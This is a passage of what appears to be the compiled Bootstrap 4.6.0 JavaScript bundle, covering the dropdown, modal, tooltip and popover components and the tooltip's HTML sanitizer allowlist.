                i.default.removeData(this._element, mt), i.default(this._element).off(gt), this._element = null, this._menu = null, null !== this._popper && (this._popper.destroy(), this._popper = null);
              }, t.update = function () {
                this._inNavbar = this._detectNavbar(), null !== this._popper && this._popper.scheduleUpdate();
              }, t._addEventListeners = function () {
                var e = this;
                i.default(this._element).on(kt, function (t) {
                  t.preventDefault(), t.stopPropagation(), e.toggle();
                });
              }, t._getConfig = function (e) {
                return e = s({}, this.constructor.Default, i.default(this._element).data(), e), v.typeCheckConfig(ht, e, this.constructor.DefaultType), e;
              }, t._getMenuElement = function () {
                if (!this._menu) {
                  var t = e._getParentFromElement(this._element);
                  t && (this._menu = t.querySelector(Ht));
                }
                return this._menu;
              }, t._getPlacement = function () {
                var e = i.default(this._element.parentNode),
                  t = Qt;
                return e.hasClass(Lt) ? t = i.default(this._menu).hasClass(Bt) ? Vt : Yt : e.hasClass(It) ? t = Kt : e.hasClass(Ft) ? t = Jt : i.default(this._menu).hasClass(Bt) && (t = Xt), t;
              }, t._detectNavbar = function () {
                return i.default(this._element).closest(".navbar").length > 0;
              }, t._getOffset = function () {
                var e = this,
                  t = {};
                return "function" == typeof this._config.offset ? t.fn = function (t) {
                  return t.offsets = s({}, t.offsets, e._config.offset(t.offsets, e._element) || {}), t;
                } : t.offset = this._config.offset, t;
              }, t._getPopperConfig = function () {
                var e = {
                  placement: this._getPlacement(),
                  modifiers: {
                    offset: this._getOffset(),
                    flip: {
                      enabled: this._config.flip
                    },
                    preventOverflow: {
                      boundariesElement: this._config.boundary
                    }
                  }
                };
                return "static" === this._config.display && (e.modifiers.applyStyle = {
                  enabled: !1
                }), s({}, e, this._config.popperConfig);
              }, e._jQueryInterface = function (t) {
                return this.each(function () {
                  var n = i.default(this).data(mt);
                  if (n || (n = new e(this, "object" == typeof t ? t : null), i.default(this).data(mt, n)), "string" == typeof t) {
                    if (void 0 === n[t]) throw new TypeError('No method named "' + t + '"');
                    n[t]();
                  }
                });
              }, e._clearMenus = function (t) {
                if (!t || t.which !== Tt && ("keyup" !== t.type || t.which === _t)) for (var n = [].slice.call(document.querySelectorAll(Ut)), r = 0, o = n.length; r < o; r++) {
                  var a = e._getParentFromElement(n[r]),
                    u = i.default(n[r]).data(mt),
                    s = {
                      relatedTarget: n[r]
                    };
                  if (t && "click" === t.type && (s.clickEvent = t), u) {
                    var d = u._menu;
                    if (i.default(a).hasClass(Pt) && !(t && ("click" === t.type && /input|textarea/i.test(t.target.tagName) || "keyup" === t.type && t.which === _t) && i.default.contains(a, t.target))) {
                      var l = i.default.Event(St, s);
                      i.default(a).trigger(l), l.isDefaultPrevented() || ("ontouchstart" in document.documentElement && i.default(document.body).children().off("mouseover", null, i.default.noop), n[r].setAttribute("aria-expanded", "false"), u._popper && u._popper.destroy(), i.default(d).removeClass(Pt), i.default(a).removeClass(Pt).trigger(i.default.Event(Dt, s)));
                    }
                  }
                }
              }, e._getParentFromElement = function (e) {
                var t,
                  n = v.getSelectorFromElement(e);
                return n && (t = document.querySelector(n)), t || e.parentNode;
              }, e._dataApiKeydownHandler = function (t) {
                if (!(/input|textarea/i.test(t.target.tagName) ? t.which === wt || t.which !== bt && (t.which !== xt && t.which !== Et || i.default(t.target).closest(Ht).length) : !Ct.test(t.which)) && !this.disabled && !i.default(this).hasClass(Rt)) {
                  var n = e._getParentFromElement(this),
                    r = i.default(n).hasClass(Pt);
                  if (r || t.which !== bt) {
                    if (t.preventDefault(), t.stopPropagation(), !r || t.which === bt || t.which === wt) return t.which === bt && i.default(n.querySelector(Ut)).trigger("focus"), void i.default(this).trigger("click");
                    var o = [].slice.call(n.querySelectorAll(zt)).filter(function (e) {
                      return i.default(e).is(":visible");
                    });
                    if (0 !== o.length) {
                      var a = o.indexOf(t.target);
                      t.which === Et && a > 0 && a--, t.which === xt && a < o.length - 1 && a++, a < 0 && (a = 0), o[a].focus();
                    }
                  }
                }
              }, u(e, null, [{
                key: "VERSION",
                get: function () {
                  return pt;
                }
              }, {
                key: "Default",
                get: function () {
                  return Gt;
                }
              }, {
                key: "DefaultType",
                get: function () {
                  return Zt;
                }
              }]), e;
            }();
          i.default(document).on(Ot, Ut, en._dataApiKeydownHandler).on(Ot, Ht, en._dataApiKeydownHandler).on(Nt + " " + jt, en._clearMenus).on(Nt, Ut, function (e) {
            e.preventDefault(), e.stopPropagation(), en._jQueryInterface.call(i.default(this), "toggle");
          }).on(Nt, qt, function (e) {
            e.stopPropagation();
          }), i.default.fn[ht] = en._jQueryInterface, i.default.fn[ht].Constructor = en, i.default.fn[ht].noConflict = function () {
            return i.default.fn[ht] = yt, en._jQueryInterface;
          };
          var tn = "modal",
            nn = "4.6.0",
            rn = "bs.modal",
            on = "." + rn,
            an = ".data-api",
            un = i.default.fn[tn],
            sn = 27,
            dn = {
              backdrop: !0,
              keyboard: !0,
              focus: !0,
              show: !0
            },
            ln = {
              backdrop: "(boolean|string)",
              keyboard: "boolean",
              focus: "boolean",
              show: "boolean"
            },
            cn = "hide" + on,
            fn = "hidePrevented" + on,
            hn = "hidden" + on,
            pn = "show" + on,
            mn = "shown" + on,
            gn = "focusin" + on,
            vn = "resize" + on,
            yn = "click.dismiss" + on,
            bn = "keydown.dismiss" + on,
            wn = "mouseup.dismiss" + on,
            _n = "mousedown.dismiss" + on,
            En = "click" + on + an,
            xn = "modal-dialog-scrollable",
            Tn = "modal-scrollbar-measure",
            Cn = "modal-backdrop",
            Sn = "modal-open",
            Dn = "fade",
            An = "show",
            $n = "modal-static",
            kn = ".modal-dialog",
            Nn = ".modal-body",
            On = '[data-toggle="modal"]',
            jn = '[data-dismiss="modal"]',
            Rn = ".fixed-top, .fixed-bottom, .is-fixed, .sticky-top",
            Pn = ".sticky-top",
            Ln = function () {
              function e(e, t) {
                this._config = this._getConfig(t), this._element = e, this._dialog = e.querySelector(kn), this._backdrop = null, this._isShown = !1, this._isBodyOverflowing = !1, this._ignoreBackdropClick = !1, this._isTransitioning = !1, this._scrollbarWidth = 0;
              }
              var t = e.prototype;
              return t.toggle = function (e) {
                return this._isShown ? this.hide() : this.show(e);
              }, t.show = function (e) {
                var t = this;
                if (!this._isShown && !this._isTransitioning) {
                  i.default(this._element).hasClass(Dn) && (this._isTransitioning = !0);
                  var n = i.default.Event(pn, {
                    relatedTarget: e
                  });
                  i.default(this._element).trigger(n), this._isShown || n.isDefaultPrevented() || (this._isShown = !0, this._checkScrollbar(), this._setScrollbar(), this._adjustDialog(), this._setEscapeEvent(), this._setResizeEvent(), i.default(this._element).on(yn, jn, function (e) {
                    return t.hide(e);
                  }), i.default(this._dialog).on(_n, function () {
                    i.default(t._element).one(wn, function (e) {
                      i.default(e.target).is(t._element) && (t._ignoreBackdropClick = !0);
                    });
                  }), this._showBackdrop(function () {
                    return t._showElement(e);
                  }));
                }
              }, t.hide = function (e) {
                var t = this;
                if (e && e.preventDefault(), this._isShown && !this._isTransitioning) {
                  var n = i.default.Event(cn);
                  if (i.default(this._element).trigger(n), this._isShown && !n.isDefaultPrevented()) {
                    this._isShown = !1;
                    var r = i.default(this._element).hasClass(Dn);
                    if (r && (this._isTransitioning = !0), this._setEscapeEvent(), this._setResizeEvent(), i.default(document).off(gn), i.default(this._element).removeClass(An), i.default(this._element).off(yn), i.default(this._dialog).off(_n), r) {
                      var o = v.getTransitionDurationFromElement(this._element);
                      i.default(this._element).one(v.TRANSITION_END, function (e) {
                        return t._hideModal(e);
                      }).emulateTransitionEnd(o);
                    } else this._hideModal();
                  }
                }
              }, t.dispose = function () {
                [window, this._element, this._dialog].forEach(function (e) {
                  return i.default(e).off(on);
                }), i.default(document).off(gn), i.default.removeData(this._element, rn), this._config = null, this._element = null, this._dialog = null, this._backdrop = null, this._isShown = null, this._isBodyOverflowing = null, this._ignoreBackdropClick = null, this._isTransitioning = null, this._scrollbarWidth = null;
              }, t.handleUpdate = function () {
                this._adjustDialog();
              }, t._getConfig = function (e) {
                return e = s({}, dn, e), v.typeCheckConfig(tn, e, ln), e;
              }, t._triggerBackdropTransition = function () {
                var e = this,
                  t = i.default.Event(fn);
                if (i.default(this._element).trigger(t), !t.isDefaultPrevented()) {
                  var n = this._element.scrollHeight > document.documentElement.clientHeight;
                  n || (this._element.style.overflowY = "hidden"), this._element.classList.add($n);
                  var r = v.getTransitionDurationFromElement(this._dialog);
                  i.default(this._element).off(v.TRANSITION_END), i.default(this._element).one(v.TRANSITION_END, function () {
                    e._element.classList.remove($n), n || i.default(e._element).one(v.TRANSITION_END, function () {
                      e._element.style.overflowY = "";
                    }).emulateTransitionEnd(e._element, r);
                  }).emulateTransitionEnd(r), this._element.focus();
                }
              }, t._showElement = function (e) {
                var t = this,
                  n = i.default(this._element).hasClass(Dn),
                  r = this._dialog ? this._dialog.querySelector(Nn) : null;
                this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE || document.body.appendChild(this._element), this._element.style.display = "block", this._element.removeAttribute("aria-hidden"), this._element.setAttribute("aria-modal", !0), this._element.setAttribute("role", "dialog"), i.default(this._dialog).hasClass(xn) && r ? r.scrollTop = 0 : this._element.scrollTop = 0, n && v.reflow(this._element), i.default(this._element).addClass(An), this._config.focus && this._enforceFocus();
                var o = i.default.Event(mn, {
                    relatedTarget: e
                  }),
                  a = function () {
                    t._config.focus && t._element.focus(), t._isTransitioning = !1, i.default(t._element).trigger(o);
                  };
                if (n) {
                  var u = v.getTransitionDurationFromElement(this._dialog);
                  i.default(this._dialog).one(v.TRANSITION_END, a).emulateTransitionEnd(u);
                } else a();
              }, t._enforceFocus = function () {
                var e = this;
                i.default(document).off(gn).on(gn, function (t) {
                  document !== t.target && e._element !== t.target && 0 === i.default(e._element).has(t.target).length && e._element.focus();
                });
              }, t._setEscapeEvent = function () {
                var e = this;
                this._isShown ? i.default(this._element).on(bn, function (t) {
                  e._config.keyboard && t.which === sn ? (t.preventDefault(), e.hide()) : e._config.keyboard || t.which !== sn || e._triggerBackdropTransition();
                }) : this._isShown || i.default(this._element).off(bn);
              }, t._setResizeEvent = function () {
                var e = this;
                this._isShown ? i.default(window).on(vn, function (t) {
                  return e.handleUpdate(t);
                }) : i.default(window).off(vn);
              }, t._hideModal = function () {
                var e = this;
                this._element.style.display = "none", this._element.setAttribute("aria-hidden", !0), this._element.removeAttribute("aria-modal"), this._element.removeAttribute("role"), this._isTransitioning = !1, this._showBackdrop(function () {
                  i.default(document.body).removeClass(Sn), e._resetAdjustments(), e._resetScrollbar(), i.default(e._element).trigger(hn);
                });
              }, t._removeBackdrop = function () {
                this._backdrop && (i.default(this._backdrop).remove(), this._backdrop = null);
              }, t._showBackdrop = function (e) {
                var t = this,
                  n = i.default(this._element).hasClass(Dn) ? Dn : "";
                if (this._isShown && this._config.backdrop) {
                  if (this._backdrop = document.createElement("div"), this._backdrop.className = Cn, n && this._backdrop.classList.add(n), i.default(this._backdrop).appendTo(document.body), i.default(this._element).on(yn, function (e) {
                    t._ignoreBackdropClick ? t._ignoreBackdropClick = !1 : e.target === e.currentTarget && ("static" === t._config.backdrop ? t._triggerBackdropTransition() : t.hide());
                  }), n && v.reflow(this._backdrop), i.default(this._backdrop).addClass(An), !e) return;
                  if (!n) return void e();
                  var r = v.getTransitionDurationFromElement(this._backdrop);
                  i.default(this._backdrop).one(v.TRANSITION_END, e).emulateTransitionEnd(r);
                } else if (!this._isShown && this._backdrop) {
                  i.default(this._backdrop).removeClass(An);
                  var o = function () {
                    t._removeBackdrop(), e && e();
                  };
                  if (i.default(this._element).hasClass(Dn)) {
                    var a = v.getTransitionDurationFromElement(this._backdrop);
                    i.default(this._backdrop).one(v.TRANSITION_END, o).emulateTransitionEnd(a);
                  } else o();
                } else e && e();
              }, t._adjustDialog = function () {
                var e = this._element.scrollHeight > document.documentElement.clientHeight;
                !this._isBodyOverflowing && e && (this._element.style.paddingLeft = this._scrollbarWidth + "px"), this._isBodyOverflowing && !e && (this._element.style.paddingRight = this._scrollbarWidth + "px");
              }, t._resetAdjustments = function () {
                this._element.style.paddingLeft = "", this._element.style.paddingRight = "";
              }, t._checkScrollbar = function () {
                var e = document.body.getBoundingClientRect();
                this._isBodyOverflowing = Math.round(e.left + e.right) < window.innerWidth, this._scrollbarWidth = this._getScrollbarWidth();
              }, t._setScrollbar = function () {
                var e = this;
                if (this._isBodyOverflowing) {
                  var t = [].slice.call(document.querySelectorAll(Rn)),
                    n = [].slice.call(document.querySelectorAll(Pn));
                  i.default(t).each(function (t, n) {
                    var r = n.style.paddingRight,
                      o = i.default(n).css("padding-right");
                    i.default(n).data("padding-right", r).css("padding-right", parseFloat(o) + e._scrollbarWidth + "px");
                  }), i.default(n).each(function (t, n) {
                    var r = n.style.marginRight,
                      o = i.default(n).css("margin-right");
                    i.default(n).data("margin-right", r).css("margin-right", parseFloat(o) - e._scrollbarWidth + "px");
                  });
                  var r = document.body.style.paddingRight,
                    o = i.default(document.body).css("padding-right");
                  i.default(document.body).data("padding-right", r).css("padding-right", parseFloat(o) + this._scrollbarWidth + "px");
                }
                i.default(document.body).addClass(Sn);
              }, t._resetScrollbar = function () {
                var e = [].slice.call(document.querySelectorAll(Rn));
                i.default(e).each(function (e, t) {
                  var n = i.default(t).data("padding-right");
                  i.default(t).removeData("padding-right"), t.style.paddingRight = n || "";
                });
                var t = [].slice.call(document.querySelectorAll("" + Pn));
                i.default(t).each(function (e, t) {
                  var n = i.default(t).data("margin-right");
                  void 0 !== n && i.default(t).css("margin-right", n).removeData("margin-right");
                });
                var n = i.default(document.body).data("padding-right");
                i.default(document.body).removeData("padding-right"), document.body.style.paddingRight = n || "";
              }, t._getScrollbarWidth = function () {
                var e = document.createElement("div");
                e.className = Tn, document.body.appendChild(e);
                var t = e.getBoundingClientRect().width - e.clientWidth;
                return document.body.removeChild(e), t;
              }, e._jQueryInterface = function (t, n) {
                return this.each(function () {
                  var r = i.default(this).data(rn),
                    o = s({}, dn, i.default(this).data(), "object" == typeof t && t ? t : {});
                  if (r || (r = new e(this, o), i.default(this).data(rn, r)), "string" == typeof t) {
                    if (void 0 === r[t]) throw new TypeError('No method named "' + t + '"');
                    r[t](n);
                  } else o.show && r.show(n);
                });
              }, u(e, null, [{
                key: "VERSION",
                get: function () {
                  return nn;
                }
              }, {
                key: "Default",
                get: function () {
                  return dn;
                }
              }]), e;
            }();
          i.default(document).on(En, On, function (e) {
            var t,
              n = this,
              r = v.getSelectorFromElement(this);
            r && (t = document.querySelector(r));
            var o = i.default(t).data(rn) ? "toggle" : s({}, i.default(t).data(), i.default(this).data());
            "A" !== this.tagName && "AREA" !== this.tagName || e.preventDefault();
            var a = i.default(t).one(pn, function (e) {
              e.isDefaultPrevented() || a.one(hn, function () {
                i.default(n).is(":visible") && n.focus();
              });
            });
            Ln._jQueryInterface.call(i.default(t), o, this);
          }), i.default.fn[tn] = Ln._jQueryInterface, i.default.fn[tn].Constructor = Ln, i.default.fn[tn].noConflict = function () {
            return i.default.fn[tn] = un, Ln._jQueryInterface;
          };
          var In = ["background", "cite", "href", "itemtype", "longdesc", "poster", "src", "xlink:href"],
            Fn = {
              "*": ["class", "dir", "id", "lang", "role", /^aria-[\w-]*$/i],
              a: ["target", "href", "title", "rel"],
              area: [],
              b: [],
              br: [],
              col: [],
              code: [],
              div: [],
              em: [],
              hr: [],
              h1: [],
              h2: [],
              h3: [],
              h4: [],
              h5: [],
              h6: [],
              i: [],
              img: ["src", "srcset", "alt", "title", "width", "height"],
              li: [],
              ol: [],
              p: [],
              pre: [],
              s: [],
              small: [],
              span: [],
              sub: [],
              sup: [],
              strong: [],
              u: [],
              ul: []
            },
            Bn = /^(?:(?:https?|mailto|ftp|tel|file):|[^#&/:?]*(?:[#/?]|$))/gi,
            Mn = /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[\d+/a-z]+=*$/i;
          function Un(e, t) {
            var n = e.nodeName.toLowerCase();
            if (-1 !== t.indexOf(n)) return -1 === In.indexOf(n) || Boolean(e.nodeValue.match(Bn) || e.nodeValue.match(Mn));
            for (var r = t.filter(function (e) {
                return e instanceof RegExp;
              }), i = 0, o = r.length; i < o; i++) if (n.match(r[i])) return !0;
            return !1;
          }
          function qn(e, t, n) {
            if (0 === e.length) return e;
            if (n && "function" == typeof n) return n(e);
            for (var r = new window.DOMParser().parseFromString(e, "text/html"), i = Object.keys(t), o = [].slice.call(r.body.querySelectorAll("*")), a = function (e, n) {
                var r = o[e],
                  a = r.nodeName.toLowerCase();
                if (-1 === i.indexOf(r.nodeName.toLowerCase())) return r.parentNode.removeChild(r), "continue";
                var u = [].slice.call(r.attributes),
                  s = [].concat(t["*"] || [], t[a] || []);
                u.forEach(function (e) {
                  Un(e, s) || r.removeAttribute(e.nodeName);
                });
              }, u = 0, s = o.length; u < s; u++) a(u);
            return r.body.innerHTML;
          }
          var Hn = "tooltip",
            Wn = "4.6.0",
            zn = "bs.tooltip",
            Yn = "." + zn,
            Vn = i.default.fn[Hn],
            Qn = "bs-tooltip",
            Xn = new RegExp("(^|\\s)" + Qn + "\\S+", "g"),
            Kn = ["sanitize", "whiteList", "sanitizeFn"],
            Jn = {
              animation: "boolean",
              template: "string",
              title: "(string|element|function)",
              trigger: "string",
              delay: "(number|object)",
              html: "boolean",
              selector: "(string|boolean)",
              placement: "(string|function)",
              offset: "(number|string|function)",
              container: "(string|element|boolean)",
              fallbackPlacement: "(string|array)",
              boundary: "(string|element)",
              customClass: "(string|function)",
              sanitize: "boolean",
              sanitizeFn: "(null|function)",
              whiteList: "object",
              popperConfig: "(null|object)"
            },
            Gn = {
              AUTO: "auto",
              TOP: "top",
              RIGHT: "right",
              BOTTOM: "bottom",
              LEFT: "left"
            },
            Zn = {
              animation: !0,
              template: '<div class="tooltip" role="tooltip"><div class="arrow"></div><div class="tooltip-inner"></div></div>',
              trigger: "hover focus",
              title: "",
              delay: 0,
              html: !1,
              selector: !1,
              placement: "top",
              offset: 0,
              container: !1,
              fallbackPlacement: "flip",
              boundary: "scrollParent",
              customClass: "",
              sanitize: !0,
              sanitizeFn: null,
              whiteList: Fn,
              popperConfig: null
            },
            er = "show",
            tr = "out",
            nr = {
              HIDE: "hide" + Yn,
              HIDDEN: "hidden" + Yn,
              SHOW: "show" + Yn,
              SHOWN: "shown" + Yn,
              INSERTED: "inserted" + Yn,
              CLICK: "click" + Yn,
              FOCUSIN: "focusin" + Yn,
              FOCUSOUT: "focusout" + Yn,
              MOUSEENTER: "mouseenter" + Yn,
              MOUSELEAVE: "mouseleave" + Yn
            },
            rr = "fade",
            ir = "show",
            or = ".tooltip-inner",
            ar = ".arrow",
            ur = "hover",
            sr = "focus",
            dr = "click",
            lr = "manual",
            cr = function () {
              function e(e, t) {
                if (void 0 === o.default) throw new TypeError("Bootstrap's tooltips require Popper (https://popper.js.org)");
                this._isEnabled = !0, this._timeout = 0, this._hoverState = "", this._activeTrigger = {}, this._popper = null, this.element = e, this.config = this._getConfig(t), this.tip = null, this._setListeners();
              }
              var t = e.prototype;
              return t.enable = function () {
                this._isEnabled = !0;
              }, t.disable = function () {
                this._isEnabled = !1;
              }, t.toggleEnabled = function () {
                this._isEnabled = !this._isEnabled;
              }, t.toggle = function (e) {
                if (this._isEnabled) if (e) {
                  var t = this.constructor.DATA_KEY,
                    n = i.default(e.currentTarget).data(t);
                  n || (n = new this.constructor(e.currentTarget, this._getDelegateConfig()), i.default(e.currentTarget).data(t, n)), n._activeTrigger.click = !n._activeTrigger.click, n._isWithActiveTrigger() ? n._enter(null, n) : n._leave(null, n);
                } else {
                  if (i.default(this.getTipElement()).hasClass(ir)) return void this._leave(null, this);
                  this._enter(null, this);
                }
              }, t.dispose = function () {
                clearTimeout(this._timeout), i.default.removeData(this.element, this.constructor.DATA_KEY), i.default(this.element).off(this.constructor.EVENT_KEY), i.default(this.element).closest(".modal").off("hide.bs.modal", this._hideModalHandler), this.tip && i.default(this.tip).remove(), this._isEnabled = null, this._timeout = null, this._hoverState = null, this._activeTrigger = null, this._popper && this._popper.destroy(), this._popper = null, this.element = null, this.config = null, this.tip = null;
              }, t.show = function () {
                var e = this;
                if ("none" === i.default(this.element).css("display")) throw new Error("Please use show on visible elements");
                var t = i.default.Event(this.constructor.Event.SHOW);
                if (this.isWithContent() && this._isEnabled) {
                  i.default(this.element).trigger(t);
                  var n = v.findShadowRoot(this.element),
                    r = i.default.contains(null !== n ? n : this.element.ownerDocument.documentElement, this.element);
                  if (t.isDefaultPrevented() || !r) return;
                  var a = this.getTipElement(),
                    u = v.getUID(this.constructor.NAME);
                  a.setAttribute("id", u), this.element.setAttribute("aria-describedby", u), this.setContent(), this.config.animation && i.default(a).addClass(rr);
                  var s = "function" == typeof this.config.placement ? this.config.placement.call(this, a, this.element) : this.config.placement,
                    d = this._getAttachment(s);
                  this.addAttachmentClass(d);
                  var l = this._getContainer();
                  i.default(a).data(this.constructor.DATA_KEY, this), i.default.contains(this.element.ownerDocument.documentElement, this.tip) || i.default(a).appendTo(l), i.default(this.element).trigger(this.constructor.Event.INSERTED), this._popper = new o.default(this.element, a, this._getPopperConfig(d)), i.default(a).addClass(ir), i.default(a).addClass(this.config.customClass), "ontouchstart" in document.documentElement && i.default(document.body).children().on("mouseover", null, i.default.noop);
                  var c = function () {
                    e.config.animation && e._fixTransition();
                    var t = e._hoverState;
                    e._hoverState = null, i.default(e.element).trigger(e.constructor.Event.SHOWN), t === tr && e._leave(null, e);
                  };
                  if (i.default(this.tip).hasClass(rr)) {
                    var f = v.getTransitionDurationFromElement(this.tip);
                    i.default(this.tip).one(v.TRANSITION_END, c).emulateTransitionEnd(f);
                  } else c();
                }
              }, t.hide = function (e) {
                var t = this,
                  n = this.getTipElement(),
                  r = i.default.Event(this.constructor.Event.HIDE),
                  o = function () {
                    t._hoverState !== er && n.parentNode && n.parentNode.removeChild(n), t._cleanTipClass(), t.element.removeAttribute("aria-describedby"), i.default(t.element).trigger(t.constructor.Event.HIDDEN), null !== t._popper && t._popper.destroy(), e && e();
                  };
                if (i.default(this.element).trigger(r), !r.isDefaultPrevented()) {
                  if (i.default(n).removeClass(ir), "ontouchstart" in document.documentElement && i.default(document.body).children().off("mouseover", null, i.default.noop), this._activeTrigger[dr] = !1, this._activeTrigger[sr] = !1, this._activeTrigger[ur] = !1, i.default(this.tip).hasClass(rr)) {
                    var a = v.getTransitionDurationFromElement(n);
                    i.default(n).one(v.TRANSITION_END, o).emulateTransitionEnd(a);
                  } else o();
                  this._hoverState = "";
                }
              }, t.update = function () {
                null !== this._popper && this._popper.scheduleUpdate();
              }, t.isWithContent = function () {
                return Boolean(this.getTitle());
              }, t.addAttachmentClass = function (e) {
                i.default(this.getTipElement()).addClass(Qn + "-" + e);
              }, t.getTipElement = function () {
                return this.tip = this.tip || i.default(this.config.template)[0], this.tip;
              }, t.setContent = function () {
                var e = this.getTipElement();
                this.setElementContent(i.default(e.querySelectorAll(or)), this.getTitle()), i.default(e).removeClass(rr + " " + ir);
              }, t.setElementContent = function (e, t) {
                "object" != typeof t || !t.nodeType && !t.jquery ? this.config.html ? (this.config.sanitize && (t = qn(t, this.config.whiteList, this.config.sanitizeFn)), e.html(t)) : e.text(t) : this.config.html ? i.default(t).parent().is(e) || e.empty().append(t) : e.text(i.default(t).text());
              }, t.getTitle = function () {
                var e = this.element.getAttribute("data-original-title");
                return e || (e = "function" == typeof this.config.title ? this.config.title.call(this.element) : this.config.title), e;
              }, t._getPopperConfig = function (e) {
                var t = this;
                return s({}, {
                  placement: e,
                  modifiers: {
                    offset: this._getOffset(),
                    flip: {
                      behavior: this.config.fallbackPlacement
                    },
                    arrow: {
                      element: ar
                    },
                    preventOverflow: {
                      boundariesElement: this.config.boundary
                    }
                  },
                  onCreate: function (e) {
                    e.originalPlacement !== e.placement && t._handlePopperPlacementChange(e);
                  },
                  onUpdate: function (e) {
                    return t._handlePopperPlacementChange(e);
                  }
                }, this.config.popperConfig);
              }, t._getOffset = function () {
                var e = this,
                  t = {};
                return "function" == typeof this.config.offset ? t.fn = function (t) {
                  return t.offsets = s({}, t.offsets, e.config.offset(t.offsets, e.element) || {}), t;
                } : t.offset = this.config.offset, t;
              }, t._getContainer = function () {
                return !1 === this.config.container ? document.body : v.isElement(this.config.container) ? i.default(this.config.container) : i.default(document).find(this.config.container);
              }, t._getAttachment = function (e) {
                return Gn[e.toUpperCase()];
              }, t._setListeners = function () {
                var e = this;
                this.config.trigger.split(" ").forEach(function (t) {
                  if ("click" === t) i.default(e.element).on(e.constructor.Event.CLICK, e.config.selector, function (t) {
                    return e.toggle(t);
                  });else if (t !== lr) {
                    var n = t === ur ? e.constructor.Event.MOUSEENTER : e.constructor.Event.FOCUSIN,
                      r = t === ur ? e.constructor.Event.MOUSELEAVE : e.constructor.Event.FOCUSOUT;
                    i.default(e.element).on(n, e.config.selector, function (t) {
                      return e._enter(t);
                    }).on(r, e.config.selector, function (t) {
                      return e._leave(t);
                    });
                  }
                }), this._hideModalHandler = function () {
                  e.element && e.hide();
                }, i.default(this.element).closest(".modal").on("hide.bs.modal", this._hideModalHandler), this.config.selector ? this.config = s({}, this.config, {
                  trigger: "manual",
                  selector: ""
                }) : this._fixTitle();
              }, t._fixTitle = function () {
                var e = typeof this.element.getAttribute("data-original-title");
                (this.element.getAttribute("title") || "string" !== e) && (this.element.setAttribute("data-original-title", this.element.getAttribute("title") || ""), this.element.setAttribute("title", ""));
              }, t._enter = function (e, t) {
                var n = this.constructor.DATA_KEY;
                (t = t || i.default(e.currentTarget).data(n)) || (t = new this.constructor(e.currentTarget, this._getDelegateConfig()), i.default(e.currentTarget).data(n, t)), e && (t._activeTrigger["focusin" === e.type ? sr : ur] = !0), i.default(t.getTipElement()).hasClass(ir) || t._hoverState === er ? t._hoverState = er : (clearTimeout(t._timeout), t._hoverState = er, t.config.delay && t.config.delay.show ? t._timeout = setTimeout(function () {
                  t._hoverState === er && t.show();
                }, t.config.delay.show) : t.show());
              }, t._leave = function (e, t) {
                var n = this.constructor.DATA_KEY;
                (t = t || i.default(e.currentTarget).data(n)) || (t = new this.constructor(e.currentTarget, this._getDelegateConfig()), i.default(e.currentTarget).data(n, t)), e && (t._activeTrigger["focusout" === e.type ? sr : ur] = !1), t._isWithActiveTrigger() || (clearTimeout(t._timeout), t._hoverState = tr, t.config.delay && t.config.delay.hide ? t._timeout = setTimeout(function () {
                  t._hoverState === tr && t.hide();
                }, t.config.delay.hide) : t.hide());
              }, t._isWithActiveTrigger = function () {
                for (var e in this._activeTrigger) if (this._activeTrigger[e]) return !0;
                return !1;
              }, t._getConfig = function (e) {
                var t = i.default(this.element).data();
                return Object.keys(t).forEach(function (e) {
                  -1 !== Kn.indexOf(e) && delete t[e];
                }), "number" == typeof (e = s({}, this.constructor.Default, t, "object" == typeof e && e ? e : {})).delay && (e.delay = {
                  show: e.delay,
                  hide: e.delay
                }), "number" == typeof e.title && (e.title = e.title.toString()), "number" == typeof e.content && (e.content = e.content.toString()), v.typeCheckConfig(Hn, e, this.constructor.DefaultType), e.sanitize && (e.template = qn(e.template, e.whiteList, e.sanitizeFn)), e;
              }, t._getDelegateConfig = function () {
                var e = {};
                if (this.config) for (var t in this.config) this.constructor.Default[t] !== this.config[t] && (e[t] = this.config[t]);
                return e;
              }, t._cleanTipClass = function () {
                var e = i.default(this.getTipElement()),
                  t = e.attr("class").match(Xn);
                null !== t && t.length && e.removeClass(t.join(""));
              }, t._handlePopperPlacementChange = function (e) {
                this.tip = e.instance.popper, this._cleanTipClass(), this.addAttachmentClass(this._getAttachment(e.placement));
              }, t._fixTransition = function () {
                var e = this.getTipElement(),
                  t = this.config.animation;
                null === e.getAttribute("x-placement") && (i.default(e).removeClass(rr), this.config.animation = !1, this.hide(), this.show(), this.config.animation = t);
              }, e._jQueryInterface = function (t) {
                return this.each(function () {
                  var n = i.default(this),
                    r = n.data(zn),
                    o = "object" == typeof t && t;
                  if ((r || !/dispose|hide/.test(t)) && (r || (r = new e(this, o), n.data(zn, r)), "string" == typeof t)) {
                    if (void 0 === r[t]) throw new TypeError('No method named "' + t + '"');
                    r[t]();
                  }
                });
              }, u(e, null, [{
                key: "VERSION",
                get: function () {
                  return Wn;
                }
              }, {
                key: "Default",
                get: function () {
                  return Zn;
                }
              }, {
                key: "NAME",
                get: function () {
                  return Hn;
                }
              }, {
                key: "DATA_KEY",
                get: function () {
                  return zn;
                }
              }, {
                key: "Event",
                get: function () {
                  return nr;
                }
              }, {
                key: "EVENT_KEY",
                get: function () {
                  return Yn;
                }
              }, {
                key: "DefaultType",
                get: function () {
                  return Jn;
                }
              }]), e;
            }();
          i.default.fn[Hn] = cr._jQueryInterface, i.default.fn[Hn].Constructor = cr, i.default.fn[Hn].noConflict = function () {
            return i.default.fn[Hn] = Vn, cr._jQueryInterface;
          };
          var fr = "popover",
            hr = "4.6.0",
            pr = "bs.popover",
            mr = "." + pr,
            gr = i.default.fn[fr],
            vr = "bs-popover",
            yr = new RegExp("(^|\\s)" + vr + "\\S+", "g"),
            br = s({}, cr.Default, {
              placement: "right",
              trigger: "click",
              content: "",
              template: '<div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>'
            }),
            wr = s({}, cr.DefaultType, {
              content: "(string|element|function)"
            }),
            _r = "fade",
            Er = "show",
            xr = ".popover-header",
            Tr = ".popover-body",
            Cr = {
              HIDE: "hide" + mr,
              HIDDEN: "hidden" + mr,
              SHOW: "show" + mr,
              SHOWN: "shown" + mr,
              INSERTED: "inserted" + mr,
              CLICK: "click" + mr,
              FOCUSIN: "focusin" + mr,
              FOCUSOUT: "focusout" + mr,
              MOUSEENTER: "mouseenter" + mr,
